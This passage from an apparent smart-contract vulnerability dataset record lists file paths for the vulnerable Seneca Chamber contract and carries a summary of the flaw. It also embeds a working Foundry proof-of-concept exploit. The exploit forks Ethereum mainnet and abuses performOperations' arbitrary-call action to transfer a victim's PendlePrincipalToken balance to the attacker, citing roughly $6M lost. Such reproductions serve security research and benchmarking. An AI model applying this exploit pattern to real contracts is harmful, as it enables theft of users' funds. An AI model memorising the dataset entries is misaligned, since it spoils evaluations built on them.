e_65c210c5_chamber/sources/contracts/Constants.sol", "data/contracts/2024_02_seneca/contracts/01_vulnerable_65c210c5_chamber/sources/contracts/interfaces/IBentoBoxV1.sol", "data/contracts/2024_02_seneca/contracts/01_vulnerable_65c210c5_chamber/sources/contracts/interfaces/IMasterContract.sol", "data/contracts/2024_02_seneca/contracts/01_vulnerable_65c210c5_chamber/sources/contracts/interfaces/IOracle.sol", "data/contracts/2024_02_seneca/contracts/01_vulnerable_65c210c5_chamber/sources/contracts/interfaces/IStrategy.sol", "data/contracts/2024_02_seneca/contracts/01_vulnerable_65c210c5_chamber/sources/contracts/interfaces/ISwapperV2.sol", "data/contracts/2024_02_seneca/contracts/01_vulnerable_65c210c5_chamber/sources/contracts/libraries/BoringRebase.sol"], "source_hint": "AI extracted: The `performOperations` function in the `IChamber` contract allows arbitrary calls via `OPERATION_CALL`. The attacker crafts a `datas` array containing encoded `transferFrom` calls, effectively draining the victim's `PendlePrincipalToken` balance.", "verification_status": "verified"}], "contracts_dir": "data/contracts/2024_02_seneca", "id": "2024_02_seneca", "metadata": {"ai_enabled": true, "ai_model": "gemini-2.5-flash-lite|gemini-2.5-flash-lite", "dataset_version": "1.0.0", "poc_parser_version": "1.0.0", "processed_at": "2026-04-10T06:36:41.520Z"}, "num_bytecode_contracts": 1, "num_contracts": 1, "num_source_contracts": 1, "num_verified_contracts": 1, "poc_code": "// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$6M
// Attacker : https://etherscan.io/address/0x94641c01a4937f2c8ef930580cf396142a2942dc
// Vuln Contract : https://etherscan.io/address/0x65c210c59b43eb68112b7a4f75c8393c36491f06
// Attack Tx : https://app.blocksec.com/explorer/tx/eth/0x23fcf9d4517f7cc39815b09b0a80c023ab2c8196c826c93b4100f2e26b701286

// @Analysis
// https://twitter.com/Phalcon_xyz/status/1763045563040411876

interface IChamber {
    function performOperations(
        uint8[] memory actions,
        uint256[] memory values,
        bytes[] memory datas
    ) external payable returns (uint256 value1, uint256 value2);
}

contract ContractTest is Test {
    IChamber private constant Chamber = IChamber(0x65c210c59B43EB68112b7a4f75C8393C36491F06);
    IERC20 private constant PendlePrincipalToken = IERC20(0xB05cABCd99cf9a73b19805edefC5f67CA5d1895E);
    address private constant victim = 0x9CBF099ff424979439dFBa03F00B5961784c06ce;
    uint8 public constant OPERATION_CALL = 30;

    function setUp() public {
        vm.createSelectFork("mainnet", 19_325_936);
        vm.label(address(Chamber), "Chamber");
        vm.label(address(PendlePrincipalToken), "PendlePrincipalToken");
        vm.label(victim, "victim");
    }

    function testExploit() public {
        // Datas
        uint256 amount = PendlePrincipalToken.balanceOf(victim);
        bytes memory callData =
            abi.encodeWithSignature("transferFrom(address,address,uint256)", victim, address(this), amount);
        bytes memory data = abi.encode(address(PendlePrincipalToken), callData, uint256(0), uint256(0), uint256(0));
        bytes[] memory datas = new bytes[](1);
        datas[0] = data;

        // Actions
        uint8[] memory actions = new uint8[](1);
        actions[0] = OPERATION_CALL;

        // Values
        uint256[] memory values = new uint256[](1);
        values[0] = uint256(0);

        emit log_named_decimal_uint(
            "Exploiter PendlePrincipalToken balance before attack",
            PendlePrincipalToken.balanceOf(address(this)),
            PendlePrincipalToken.decimals()
        );

        Chamber.performOperations(actions, values, datas);

        emit log_named_decimal_uint(
            "Exploiter PendlePrincipalToken balance after attack",
            PendlePrincipalToken.balanceOf(address(this)),
            PendlePrincipalToken.decimals()
        );
    }
}
